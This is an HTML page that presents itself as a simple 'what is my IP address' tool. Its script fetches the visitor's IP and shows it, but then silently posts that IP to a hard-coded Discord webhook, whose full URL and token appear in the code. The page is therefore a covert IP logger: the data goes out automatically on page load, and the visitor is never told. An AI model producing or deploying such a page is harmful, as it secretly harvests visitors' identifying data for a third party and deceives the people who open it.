<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My IP Address</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        #ip { font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Your IP Address is:</h1>
    <p id="ip">Loading...</p>

    <script>
        // Fetch IP address
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Only use the IP from this fetch request
                const userIP = data.ip;
                document.getElementById('ip').textContent = userIP;

                // Send Webhook with the correct IP
                return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: `User's IP: ${userIP}` }) // Sending only the correct IP
                });
            })
            .then(response => response.text())
            .then(result => {
                console.log('Webhook response:', result);
                console.log("Script execution completed.");
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('ip').textContent = 'Failed to fetch IP.';
            });
    </script>
</body>
</html>
